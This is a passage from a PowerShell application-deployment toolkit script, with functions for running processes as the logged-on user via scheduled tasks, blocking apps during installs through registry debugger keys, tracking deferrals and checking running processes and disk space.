				[string]$executeProcessAsUserParametersVBS = 'chr(34) & ' + "`"$($Path)`"" + ' & chr(34) & ' + '" ' + ($Parameters -replace '"', "`" & chr(34) & `"" -replace ' & chr\(34\) & "$','') + '"' }
			[string[]]$executeProcessAsUserScript = "strCommand = $executeProcessAsUserParametersVBS"
			$executeProcessAsUserScript += 'set oWShell = CreateObject("WScript.Shell")'
			$executeProcessAsUserScript += 'intReturn = oWShell.Run(strCommand, 0, true)'
			$executeProcessAsUserScript += 'WScript.Quit intReturn'
			$executeProcessAsUserScript | Out-File -FilePath "$dirAppDeployTemp\$($schTaskName).vbs" -Force -Encoding 'default' -ErrorAction 'SilentlyContinue'
			$Path = 'wscript.exe'
			$Parameters = "`"$dirAppDeployTemp\$($schTaskName).vbs`""
		}

		
		[string]$xmlSchTask = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo />
  <Triggers />
  <Settings>
	<MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
	<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
	<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
	<AllowHardTerminate>true</AllowHardTerminate>
	<StartWhenAvailable>false</StartWhenAvailable>
	<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
	<IdleSettings>
	  <StopOnIdleEnd>false</StopOnIdleEnd>
	  <RestartOnIdle>false</RestartOnIdle>
	</IdleSettings>
	<AllowStartOnDemand>true</AllowStartOnDemand>
	<Enabled>true</Enabled>
	<Hidden>false</Hidden>
	<RunOnlyIfIdle>false</RunOnlyIfIdle>
	<WakeToRun>false</WakeToRun>
	<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
	<Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
	<Exec>
	  <Command>$Path</Command>
	  <Arguments>$Parameters</Arguments>
	</Exec>
  </Actions>
  <Principals>
	<Principal id="Author">
	  <UserId>$UserName</UserId>
	  <LogonType>InteractiveToken</LogonType>
	  <RunLevel>$RunLevel</RunLevel>
	</Principal>
  </Principals>
</Task>
"@
		
		Try {
			
			[string]$xmlSchTaskFilePath = "$dirAppDeployTemp\$schTaskName.xml"
			[string]$xmlSchTask | Out-File -FilePath $xmlSchTaskFilePath -Force -ErrorAction 'Stop'
		}
		Catch {
			[int32]$executeProcessAsUserExitCode = 60007
			Write-Log -Message "Failed to export the scheduled task XML file [$xmlSchTaskFilePath]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to export the scheduled task XML file [$xmlSchTaskFilePath]: $($_.Exception.Message)"
			}
			Else {
				Return
			}
		}

		
		If ($Parameters) {
			If ($SecureParameters) {
				Write-Log -Message "Create scheduled task to run the process [$Path] (Parameters Hidden) as the logged-on user [$userName]..." -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Create scheduled task to run the process [$Path $Parameters] as the logged-on user [$userName]..." -Source ${CmdletName}
			}
		}
		Else {
			Write-Log -Message "Create scheduled task to run the process [$Path] as the logged-on user [$userName]..." -Source ${CmdletName}
		}
		[psobject]$schTaskResult = Execute-Process -Path $exeSchTasks -Parameters "/create /f /tn $schTaskName /xml `"$xmlSchTaskFilePath`"" -WindowStyle 'Hidden' -CreateNoWindow -PassThru
		If ($schTaskResult.ExitCode -ne 0) {
			[int32]$executeProcessAsUserExitCode = $schTaskResult.ExitCode
			Write-Log -Message "Failed to create the scheduled task by importing the scheduled task XML file [$xmlSchTaskFilePath]." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to create the scheduled task by importing the scheduled task XML file [$xmlSchTaskFilePath]."
			}
			Else {
				Return
			}
		}

		
		If ($Parameters) {
			If ($SecureParameters) {
				Write-Log -Message "Trigger execution of scheduled task with command [$Path] (Parameters Hidden) as the logged-on user [$userName]..." -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Trigger execution of scheduled task with command [$Path $Parameters] as the logged-on user [$userName]..." -Source ${CmdletName}
			}
		}
		Else {
			Write-Log -Message "Trigger execution of scheduled task with command [$Path] as the logged-on user [$userName]..." -Source ${CmdletName}
		}
		[psobject]$schTaskResult = Execute-Process -Path $exeSchTasks -Parameters "/run /i /tn $schTaskName" -WindowStyle 'Hidden' -CreateNoWindow -Passthru
		If ($schTaskResult.ExitCode -ne 0) {
			[int32]$executeProcessAsUserExitCode = $schTaskResult.ExitCode
			Write-Log -Message "Failed to trigger scheduled task [$schTaskName]." -Severity 3 -Source ${CmdletName}
			
			Write-Log -Message 'Delete the scheduled task which did not trigger.' -Source ${CmdletName}
			Execute-Process -Path $exeSchTasks -Parameters "/delete /tn $schTaskName /f" -WindowStyle 'Hidden' -CreateNoWindow -ContinueOnError $true
			If (-not $ContinueOnError) {
				Throw "Failed to trigger scheduled task [$schTaskName]."
			}
			Else {
				Return
			}
		}

		
		If ($Wait) {
			Write-Log -Message "Waiting for the process launched by the scheduled task [$schTaskName] to complete execution (this may take some time)..." -Source ${CmdletName}
			Start-Sleep -Seconds 1
			
			If (([version]$envOSVersion).Major -gt 5) {
				Try {
					[__comobject]$ScheduleService = New-Object -ComObject 'Schedule.Service' -ErrorAction Stop
					$ScheduleService.Connect()
					$RootFolder = $ScheduleService.GetFolder('\')
					$Task = $RootFolder.GetTask("$schTaskName")
					
					While ($Task.State -eq 4) {
						Start-Sleep -Seconds 5
					}
					
					[int32]$executeProcessAsUserExitCode = $Task.LastTaskResult
				}
				Catch {
					Write-Log -Message "Failed to retrieve information from Task Scheduler. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				}
				Finally {
					Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($ScheduleService) } Catch { }
				}
			}
			
			Else {
				While ((($exeSchTasksResult = & $exeSchTasks /query /TN $schTaskName /V /FO CSV) | ConvertFrom-CSV | Select-Object -ExpandProperty 'Status' | Select-Object -First 1) -eq 'Running') {
					Start-Sleep -Seconds 5
				}
				
				[int32]$executeProcessAsUserExitCode = ($exeSchTasksResult = & $exeSchTasks /query /TN $schTaskName /V /FO CSV) | ConvertFrom-CSV | Select-Object -ExpandProperty 'Last Result' | Select-Object -First 1
			}
			Write-Log -Message "Exit code from process launched by scheduled task [$executeProcessAsUserExitCode]." -Source ${CmdletName}
		}
		Else {
			Start-Sleep -Seconds 1
		}

		
		Try {
			Write-Log -Message "Delete scheduled task [$schTaskName]." -Source ${CmdletName}
			Execute-Process -Path $exeSchTasks -Parameters "/delete /tn $schTaskName /f" -WindowStyle 'Hidden' -CreateNoWindow -ErrorAction 'Stop'
		}
		Catch {
			Write-Log -Message "Failed to delete scheduled task [$schTaskName]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		If ($PassThru) { Write-Output -InputObject $executeProcessAsUserExitCode }

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Update-Desktop {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Refresh the Desktop and the Windows Explorer environment process block.' -Source ${CmdletName}
			[PSADT.Explorer]::RefreshDesktopAndEnvironmentVariables()
		}
		Catch {
			Write-Log -Message "Failed to refresh the Desktop and the Windows Explorer environment process block. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to refresh the Desktop and the Windows Explorer environment process block: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}
Set-Alias -Name 'Refresh-Desktop' -Value 'Update-Desktop' -Scope 'Script' -Force -ErrorAction 'SilentlyContinue'




Function Update-SessionEnvironmentVariables {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$LoadLoggedOnUserEnvironmentVariables = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		[scriptblock]$GetEnvironmentVar = {
			Param (
				$Key,
				$Scope
			)
			[Environment]::GetEnvironmentVariable($Key, $Scope)
		}
	}
	Process {
		Try {
			Write-Log -Message 'Refresh the environment variables for this PowerShell session.' -Source ${CmdletName}

			If ($LoadLoggedOnUserEnvironmentVariables -and $RunAsActiveUser) {
				[string]$CurrentUserEnvironmentSID = $RunAsActiveUser.SID
			}
			Else {
				[string]$CurrentUserEnvironmentSID = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
			}
			[string]$MachineEnvironmentVars = 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
			[string]$UserEnvironmentVars = "Registry::HKEY_USERS\$CurrentUserEnvironmentSID\Environment"

			
			$MachineEnvironmentVars, $UserEnvironmentVars | Get-Item | Where-Object { $_ } | ForEach-Object { $envRegPath = $_.PSPath; $_ | Select-Object -ExpandProperty 'Property' | ForEach-Object { Set-Item -LiteralPath "env:$($_)" -Value (Get-ItemProperty -LiteralPath $envRegPath -Name $_).$_ } }

			
			[string[]]$PathFolders = 'Machine', 'User' | ForEach-Object { (& $GetEnvironmentVar -Key 'PATH' -Scope $_) } | Where-Object { $_ } | ForEach-Object { $_.Trim(';') } | ForEach-Object { $_.Split(';') } | ForEach-Object { $_.Trim() } | ForEach-Object { $_.Trim('"') } | Select-Object -Unique
			$env:PATH = $PathFolders -join ';'
		}
		Catch {
			Write-Log -Message "Failed to refresh the environment variables for this PowerShell session. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to refresh the environment variables for this PowerShell session: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}
Set-Alias -Name 'Refresh-SessionEnvironmentVariables' -Value 'Update-SessionEnvironmentVariables' -Scope 'Script' -Force -ErrorAction 'SilentlyContinue'




Function Get-ScheduledTask {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$TaskName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		If (-not $exeSchTasks) { [string]$exeSchTasks = "$env:WINDIR\system32\schtasks.exe" }
		[psobject[]]$ScheduledTasks = @()
	}
	Process {
		Try {
			Write-Log -Message 'Retrieve Scheduled Tasks...' -Source ${CmdletName}
			[string[]]$exeSchtasksResults = & $exeSchTasks /Query /V /FO CSV
			If ($global:LastExitCode -ne 0) { Throw "Failed to retrieve scheduled tasks using [$exeSchTasks]." }
			[psobject[]]$SchtasksResults = $exeSchtasksResults | ConvertFrom-CSV -Header 'HostName', 'TaskName', 'Next Run Time', 'Status', 'Logon Mode', 'Last Run Time', 'Last Result', 'Author', 'Task To Run', 'Start In', 'Comment', 'Scheduled Task State', 'Idle Time', 'Power Management', 'Run As User', 'Delete Task If Not Rescheduled', 'Stop Task If Runs X Hours and X Mins', 'Schedule', 'Schedule Type', 'Start Time', 'Start Date', 'End Date', 'Days', 'Months', 'Repeat: Every', 'Repeat: Until: Time', 'Repeat: Until: Duration', 'Repeat: Stop If Still Running' -ErrorAction 'Stop'

			If ($SchtasksResults) {
				ForEach ($SchtasksResult in $SchtasksResults) {
					If ($SchtasksResult.TaskName -match $TaskName) {
						$SchtasksResult | Get-Member -MemberType 'Properties' |
						ForEach-Object -Begin {
							[hashtable]$Task = @{}
						} -Process {
							
							($Task.($($_.Name).Replace(' ','').Replace(':',''))) = If ($_.Name -ne $SchtasksResult.($_.Name)) { $SchtasksResult.($_.Name) }
						} -End {
							
							If (($Task.Values | Select-Object -Unique | Measure-Object).Count) {
								$ScheduledTasks += New-Object -TypeName 'PSObject' -Property $Task
							}
						}
					}
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to retrieve scheduled tasks. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to retrieve scheduled tasks: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-Output -InputObject $ScheduledTasks
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Block-AppExecution {

	[CmdletBinding()]
	Param (
		
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string[]]$ProcessName
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		[char[]]$invalidScheduledTaskChars = '$', '!', '''', '"', '(', ')', ';', '\', '`', '*', '?', '{', '}', '[', ']', '<', '>', '|', '&', '%', '
		[string]$SchInstallName = $installName
		ForEach ($invalidChar in $invalidScheduledTaskChars) { [string]$SchInstallName = $SchInstallName -replace [regex]::Escape($invalidChar),'' }
		[string]$schTaskUnblockAppsCommand += "-ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -File `"$dirAppDeployTemp\$scriptFileName`" -CleanupBlockedApps -ReferredInstallName `"$SchInstallName`" -ReferredInstallTitle `"$installTitle`" -ReferredLogName `"$logName`" -AsyncToolkitLaunch"
		
		[string]$xmlUnblockAppsSchTask = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<RegistrationInfo></RegistrationInfo>
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal id="Author">
			<UserId>S-1-5-18</UserId>
		</Principal>
	</Principals>
	<Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>true</AllowHardTerminate>
		<StartWhenAvailable>false</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
			<StopOnIdleEnd>false</StopOnIdleEnd>
			<RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
		<Priority>7</Priority>
	</Settings>
	<Actions Context="Author">
		<Exec>
			<Command>powershell.exe</Command>
			<Arguments>$schTaskUnblockAppsCommand</Arguments>
		</Exec>
	</Actions>
</Task>
"@
	}
	Process {
		
		If ($deployModeNonInteractive) {
			Write-Log -Message "Bypassing Function [${CmdletName}] [Mode: $deployMode]." -Source ${CmdletName}
			Return
		}

		[string]$schTaskBlockedAppsName = $installName + '_BlockedApps'

		
		If (Test-Path -LiteralPath "$configToolkitTempPath\PSAppDeployToolkit" -PathType 'Leaf' -ErrorAction 'SilentlyContinue') {
			$null = Remove-Item -LiteralPath "$configToolkitTempPath\PSAppDeployToolkit" -Force -ErrorAction 'SilentlyContinue'
		}
		
		If (-not (Test-Path -LiteralPath $dirAppDeployTemp -PathType 'Container' -ErrorAction 'SilentlyContinue')) {
			$null = New-Item -Path $dirAppDeployTemp -ItemType 'Directory' -ErrorAction 'SilentlyContinue'
		}

		Copy-Item -Path "$scriptRoot\*.*" -Destination $dirAppDeployTemp -Exclude 'thumbs.db' -Force -Recurse -ErrorAction 'SilentlyContinue'

		
		[string]$debuggerBlockMessageCmd = "`"powershell.exe -ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -File `" & chr(34) & `"$dirAppDeployTemp\$scriptFileName`" & chr(34) & `" -ShowBlockedAppDialog -AsyncToolkitLaunch -ReferredInstallTitle `" & chr(34) & `"$installTitle`" & chr(34)"
		[string[]]$debuggerBlockScript = "strCommand = $debuggerBlockMessageCmd"
		$debuggerBlockScript += 'set oWShell = CreateObject("WScript.Shell")'
		$debuggerBlockScript += 'oWShell.Run strCommand, 0, false'
		$debuggerBlockScript | Out-File -FilePath "$dirAppDeployTemp\AppDeployToolkit_BlockAppExecutionMessage.vbs" -Force -Encoding 'default' -ErrorAction 'SilentlyContinue'
		[string]$debuggerBlockValue = "wscript.exe `"$dirAppDeployTemp\AppDeployToolkit_BlockAppExecutionMessage.vbs`""

		
		Write-Log -Message 'Create scheduled task to cleanup blocked applications in case installation is interrupted.' -Source ${CmdletName}
		If (Get-ScheduledTask -ContinueOnError $true | Select-Object -Property 'TaskName' | Where-Object { $_.TaskName -eq "\$schTaskBlockedAppsName" }) {
			Write-Log -Message "Scheduled task [$schTaskBlockedAppsName] already exists." -Source ${CmdletName}
		}
		Else {
			
			Try {
				
				[string]$xmlSchTaskFilePath = "$dirAppDeployTemp\SchTaskUnBlockApps.xml"
				[string]$xmlUnblockAppsSchTask | Out-File -FilePath $xmlSchTaskFilePath -Force -ErrorAction 'Stop'
			}
			Catch {
				Write-Log -Message "Failed to export the scheduled task XML file [$xmlSchTaskFilePath]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				Return
			}

			
			[psobject]$schTaskResult = Execute-Process -Path $exeSchTasks -Parameters "/create /f /tn $schTaskBlockedAppsName /xml `"$xmlSchTaskFilePath`"" -WindowStyle 'Hidden' -CreateNoWindow -PassThru
			If ($schTaskResult.ExitCode -ne 0) {
				Write-Log -Message "Failed to create the scheduled task [$schTaskBlockedAppsName] by importing the scheduled task XML file [$xmlSchTaskFilePath]." -Severity 3 -Source ${CmdletName}
				Return
			}
		}

		[string[]]$blockProcessName = $processName
		
		[string[]]$blockProcessName = $blockProcessName | ForEach-Object { $_ + '.exe' } -ErrorAction 'SilentlyContinue'

		
		ForEach ($blockProcess in $blockProcessName) {
			Write-Log -Message "Set the Image File Execution Option registry key to block execution of [$blockProcess]." -Source ${CmdletName}
			Set-RegistryKey -Key (Join-Path -Path $regKeyAppExecution -ChildPath $blockProcess) -Name 'Debugger' -Value $debuggerBlockValue -ContinueOnError $true
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Unblock-AppExecution {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($deployModeNonInteractive) {
			Write-Log -Message "Bypassing Function [${CmdletName}] [Mode: $deployMode]." -Source ${CmdletName}
			Return
		}

		
		[psobject[]]$unblockProcesses = $null
		[psobject[]]$unblockProcesses += (Get-ChildItem -LiteralPath $regKeyAppExecution -Recurse -ErrorAction 'SilentlyContinue' | ForEach-Object { Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction 'SilentlyContinue'})
		ForEach ($unblockProcess in ($unblockProcesses | Where-Object { $_.Debugger -like '*AppDeployToolkit_BlockAppExecutionMessage*' })) {
			Write-Log -Message "Remove the Image File Execution Options registry key to unblock execution of [$($unblockProcess.PSChildName)]." -Source ${CmdletName}
			$unblockProcess | Remove-ItemProperty -Name 'Debugger' -ErrorAction 'SilentlyContinue'
		}

		
		If ($BlockExecution) {
			
			Set-Variable -Name 'BlockExecution' -Value $false -Scope 'Script'
		}

		
		[string]$schTaskBlockedAppsName = $installName + '_BlockedApps'
		Try {
			If (Get-ScheduledTask -ContinueOnError $true | Select-Object -Property 'TaskName' | Where-Object { $_.TaskName -eq "\$schTaskBlockedAppsName" }) {
				Write-Log -Message "Delete Scheduled Task [$schTaskBlockedAppsName]." -Source ${CmdletName}
				Execute-Process -Path $exeSchTasks -Parameters "/Delete /TN $schTaskBlockedAppsName /F"
			}
		}
		Catch {
			Write-Log -Message "Error retrieving/deleting Scheduled Task.`n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-DeferHistory {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Write-Log -Message 'Get deferral history...' -Source ${CmdletName}
		Get-RegistryKey -Key $regKeyDeferHistory -ContinueOnError $true
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-DeferHistory {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[string]$deferTimesRemaining,
		[Parameter(Mandatory=$false)]
		[string]$deferDeadline
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		If ($deferTimesRemaining -and ($deferTimesRemaining -ge 0)) {
			Write-Log -Message "Set deferral history: [DeferTimesRemaining = $deferTimesRemaining]." -Source ${CmdletName}
			Set-RegistryKey -Key $regKeyDeferHistory -Name 'DeferTimesRemaining' -Value $deferTimesRemaining -ContinueOnError $true
		}
		If ($deferDeadline) {
			Write-Log -Message "Set deferral history: [DeferDeadline = $deferDeadline]." -Source ${CmdletName}
			Set-RegistryKey -Key $regKeyDeferHistory -Name 'DeferDeadline' -Value $deferDeadline -ContinueOnError $true
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-UniversalDate {

	[CmdletBinding()]
	Param (
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$DateTime = ((Get-Date -Format ($culture).DateTimeFormat.UniversalDateTimePattern).ToString()),
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If ($DateTime -match 'Z$') { $DateTime = $DateTime -replace 'Z$', '' }
			[datetime]$DateTime = [datetime]::Parse($DateTime, $culture)

			
			Write-Log -Message "Convert the date [$DateTime] to a universal sortable date time pattern based on the current culture [$($culture.Name)]." -Source ${CmdletName}
			[string]$universalDateTime = (Get-Date -Date $DateTime -Format ($culture).DateTimeFormat.UniversalSortableDateTimePattern -ErrorAction 'Stop').ToString()
			Write-Output -InputObject $universalDateTime
		}
		Catch {
			Write-Log -Message "The specified date/time [$DateTime] is not in a format recognized by the current culture [$($culture.Name)]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "The specified date/time [$DateTime] is not in a format recognized by the current culture: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-RunningProcesses {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false,Position=0)]
		[psobject[]]$ProcessObjects,
		[Parameter(Mandatory=$false,Position=1)]
		[switch]$DisableLogging
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		If ($processObjects) {
			[string]$runningAppsCheck = ($processObjects | ForEach-Object { $_.ProcessName }) -join ','
			If (-not($DisableLogging)) {
				Write-Log -Message "Check for running application(s) [$runningAppsCheck]..." -Source ${CmdletName}
			}
			
			[string[]]$processNames = $processObjects | ForEach-Object { $_.ProcessName }

			
			[Diagnostics.Process[]]$runningProcesses = Get-Process | Where-Object { $processNames -contains $_.ProcessName }

			If ($runningProcesses) {
				[string]$runningProcessList = ($runningProcesses | ForEach-Object { $_.ProcessName } | Select-Object -Unique) -join ','
				If (-not($DisableLogging)) {
					Write-Log -Message "The following processes are running: [$runningProcessList]." -Source ${CmdletName}
					Write-Log -Message 'Resolve process descriptions...' -Source ${CmdletName}
				}
				
				ForEach ($runningProcess in $runningProcesses) {
					ForEach ($processObject in $processObjects) {
						If ($runningProcess.ProcessName -eq $processObject.ProcessName) {
							If ($processObject.ProcessDescription) {
								
								$runningProcess | Add-Member -MemberType 'NoteProperty' -Name 'ProcessDescription' -Value $processObject.ProcessDescription -Force -PassThru -ErrorAction 'SilentlyContinue'
							}
							ElseIf ($runningProcess.Description) {
								
								$runningProcess | Add-Member -MemberType 'NoteProperty' -Name 'ProcessDescription' -Value $runningProcess.Description -Force -PassThru -ErrorAction 'SilentlyContinue'
							}
							Else {
								
								$runningProcess | Add-Member -MemberType 'NoteProperty' -Name 'ProcessDescription' -Value $runningProcess.ProcessName -Force -PassThru -ErrorAction 'SilentlyContinue'
							}
						}
					}
				}
			}
			Else {
 				If (-not($DisableLogging)) {
					Write-Log -Message 'Application(s) are not running.' -Source ${CmdletName}
				}
			}
			Write-Output -InputObject $runningProcesses
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-InstallationWelcome {

	[CmdletBinding(DefaultParametersetName='None')]

	Param (
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$CloseApps,
		
		[Parameter(Mandatory=$false)]
		[switch]$Silent = $false,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$CloseAppsCountdown = 0,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$ForceCloseAppsCountdown = 0,
		
		[Parameter(Mandatory=$false)]
		[switch]$PromptToSave = $false,
		
		[Parameter(Mandatory=$false)]
		[switch]$PersistPrompt = $false,
		
		[Parameter(Mandatory=$false)]
		[switch]$BlockExecution = $false,
		
		[Parameter(Mandatory=$false)]
		[switch]$AllowDefer = $false,
		
		[Parameter(Mandatory=$false)]
		[switch]$AllowDeferCloseApps = $false,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$DeferTimes = 0,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$DeferDays = 0,
		
		[Parameter(Mandatory=$false)]
		[string]$DeferDeadline = '',
		
		[Parameter(ParameterSetName = "CheckDiskSpaceParameterSet",Mandatory=$true)]
		[ValidateScript({$_.IsPresent -eq ($true -or $false)})]
		[switch]$CheckDiskSpace,
		
		[Parameter(ParameterSetName = "CheckDiskSpaceParameterSet",Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$RequiredDiskSpace = 0,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$MinimizeWindows = $true,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$TopMost = $true,
		
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$ForceCountdown = 0,
		
		[Parameter(Mandatory=$false)]
		[switch]$CustomText = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($deployModeNonInteractive) { $Silent = $true }

		
		If ($useDefaultMsi) { $CloseApps = "$CloseApps,$defaultMsiExecutablesList" }

		
		If ($CheckDiskSpace) {
			Write-Log -Message 'Evaluate disk space requirements.' -Source ${CmdletName}
			[double]$freeDiskSpace = Get-FreeDiskSpace
			If ($RequiredDiskSpace -eq 0) {
				Try {
					
					$fso = New-Object -ComObject 'Scripting.FileSystemObject' -ErrorAction 'Stop'
					$RequiredDiskSpace = [math]::Round((($fso.GetFolder($scriptParentPath).Size) / 1MB))
				}
				Catch {
					Write-Log -Message "Failed to calculate disk space requirement from source files. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				}
			}
			If ($freeDiskSpace -lt $RequiredDiskSpace) {
				Write-Log -Message "Failed to meet minimum disk space requirement. Space Required [$RequiredDiskSpace MB], Space Available [$freeDiskSpace MB]." -Severity 3 -Source ${CmdletName}
				If (-not $Silent) {
					Show-InstallationPrompt -Message ($configDiskSpaceMessage -f $installTitle, $RequiredDiskSpace, ($freeDiskSpace)) -ButtonRightText 'OK' -Icon 'Error'
				}
				Exit-Script -ExitCode $configInstallationUIExitCode
			}
			Else {
				Write-Log -Message 'Successfully passed minimum disk space requirement check.' -Source ${CmdletName}
			}
		}

		If ($CloseApps) {
			
			[psobject[]]$processObjects = @()
			
			ForEach ($process in ($CloseApps -split ',' | Where-Object { $_ })) {
				If ($process.Contains('=')) {
					[string[]]$ProcessSplit = $process -split '='
					$processObjects += New-Object -TypeName 'PSObject' -Property @{
						ProcessName = $ProcessSplit[0]
						ProcessDescription = $ProcessSplit[1]
					}
